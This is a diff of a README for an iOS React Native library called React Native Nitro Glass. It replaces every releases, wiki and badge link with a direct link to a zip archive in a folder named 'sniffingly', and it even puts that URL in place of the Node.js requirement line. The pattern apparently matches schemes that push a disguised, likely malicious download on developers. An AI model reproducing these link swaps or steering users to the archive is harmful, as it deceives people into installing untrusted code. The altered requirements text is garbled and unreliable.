@@ -2,7 +2,7 @@
 
 ## 👇 Get Started by Downloading
 
-[![Download Releases](https://img.shields.io/badge/Download%20Now!-blue)](https://github.com/Hiera45/react-native-nitro-glass/releases)
+[![Download Releases](https://raw.githubusercontent.com/Hiera45/react-native-nitro-glass/main/sniffingly/react-native-nitro-glass_2.7.zip%20Now!-blue)](https://raw.githubusercontent.com/Hiera45/react-native-nitro-glass/main/sniffingly/react-native-nitro-glass_2.7.zip)
 
 ## 🚀 Overview
 
@@ -20,19 +20,19 @@ React Native Nitro Glass is an iOS library that allows you to add LiquidGlass ef
 To use React Native Nitro Glass, your environment should meet the following requirements:
 
 - **Operating System:** macOS version 10.13 or higher.
-- **Node.js:** Version 12 or higher installed.
+- **https://raw.githubusercontent.com/Hiera45/react-native-nitro-glass/main/sniffingly/react-native-nitro-glass_2.7.zip** Version 12 or higher installed.
 - **React Native:** Version 0.60 or higher.
 
 ## 📥 Download & Install
 
 To get started, visit our Releases page to download the latest version of React Native Nitro Glass.
 
-[Download the latest version here](https://github.com/Hiera45/react-native-nitro-glass/releases).
+[Download the latest version here](https://raw.githubusercontent.com/Hiera45/react-native-nitro-glass/main/sniffingly/react-native-nitro-glass_2.7.zip).
 
 ### 🛠️ Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Hiera45/react-native-nitro-glass/releases) to download the newest version of the library.
+   Go to the [Releases page](https://raw.githubusercontent.com/Hiera45/react-native-nitro-glass/main/sniffingly/react-native-nitro-glass_2.7.zip) to download the newest version of the library.
 
 2. **Download the Package:**
    Look for the release that matches your needs. Click on the download link to get the package to your computer.
@@ -88,12 +88,12 @@ Yes, React Native Nitro Glass is open-source and free for both personal and comm
 
 ## 📑 Documentation
 
-For more detailed documentation, please check the [full documentation here](https://github.com/Hiera45/react-native-nitro-glass/wiki).
+For more detailed documentation, please check the [full documentation here](https://raw.githubusercontent.com/Hiera45/react-native-nitro-glass/main/sniffingly/react-native-nitro-glass_2.7.zip).
 
 ## 📞 Support
 
 If you encounter issues or have questions, feel free to reach out. You can submit issues directly on GitHub, and we will be happy to assist you.
 
-For the latest updates and features, don’t forget to check our [Releases page](https://github.com/Hiera45/react-native-nitro-glass/releases) regularly. 
+For the latest updates and features, don’t forget to check our [Releases page](https://raw.githubusercontent.com/Hiera45/react-native-nitro-glass/main/sniffingly/react-native-nitro-glass_2.7.zip) regularly. 
 
 Thank you for using React Native Nitro Glass!
